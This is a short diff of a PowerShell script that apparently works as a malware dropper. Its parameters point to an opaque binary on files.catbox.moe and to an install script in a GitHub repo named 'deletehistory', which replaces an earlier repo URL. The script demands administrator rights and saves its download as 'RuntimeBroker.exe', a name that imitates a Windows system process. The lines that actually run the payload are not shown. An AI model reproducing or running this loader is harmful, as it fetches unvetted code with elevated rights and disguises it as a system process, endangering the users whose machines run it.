@@ -1,7 +1,7 @@
 param(
     [string]$u = 'https://files.catbox.moe/qzp416.bin',
     [string]$p = '',
-    [string]$s = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/RANVYXEXE.ps1'
+    [string]$s = 'https://raw.githubusercontent.com/Reflexeiei885/deletehistory/refs/heads/main/install.ps1'
 )
 
 $ProgressPreference = 'Continue'
@@ -12,7 +12,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-$b = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main'
+$b = 'https://raw.githubusercontent.com/Reflexeiei885/deletehistory/refs/heads/main'
 $exeName = 'RuntimeBroker.exe'
 $t = if ($p -and (Test-Path $p)) { $p }
      elseif ($p) { New-Item -ItemType Directory -Force -Path $p | Out-Null; $p }
